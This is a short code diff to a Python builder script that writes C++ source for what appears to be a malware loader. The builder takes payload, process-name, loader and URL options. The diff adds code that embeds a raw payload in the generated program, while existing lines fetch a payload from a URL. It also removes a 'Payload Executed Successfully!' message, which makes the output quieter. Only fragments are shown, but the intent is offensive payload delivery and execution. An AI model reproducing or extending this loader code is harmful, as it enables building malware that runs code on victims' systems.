@@ -1,7 +1,7 @@
 import os
 import time
 from cli import *
-from local_payload_fetch import *
+from local_load import *
 
 def build (Enumeration, Payload, ProcessName, Loader, Url):
     f = open ("main.cpp", "a")
@@ -43,6 +43,12 @@ int main()
     HANDLE hThread;
     """)
 
+    if Payload != "null":
+        f.write(f"""\n
+    pPayloadSize = sizeof(Data_RawData);
+    pPayloadAddress = Data_RawData;
+""")
+
     if Url != "null":
         f.write(f"""\n
     if(!FetchFileFromURLA(Url.c_str(), &pPayloadAddress, &pPayloadSize)){{
@@ -67,8 +73,6 @@ int main()
         return 0;
     }}
             
-    printf("Payload Executed Successfully!\\n");
-
     return 0;
 }}
 """)
